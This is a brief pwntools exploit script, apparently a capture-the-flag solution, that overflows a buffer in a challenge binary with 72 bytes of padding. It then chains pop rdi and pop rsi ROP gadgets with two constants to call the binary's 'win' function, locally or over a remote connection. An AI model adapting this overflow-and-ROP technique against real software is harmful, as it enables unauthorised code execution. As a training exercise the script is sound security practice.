#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
                    b * vuln + 91
                    c
                       """)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    e_rop = ROP(exe)
    payload = flat(
        "A" * 72,
        e_rop.find_gadget(["pop rdi", "ret"])[0],
        p64(0x00435343434e0000),
        e_rop.find_gadget(["pop rsi", "ret"])[0],
        p64(0x005a44494b530000),
        p64(exe.sym.win)
    )

    r.sendlineafter("now ! :", payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
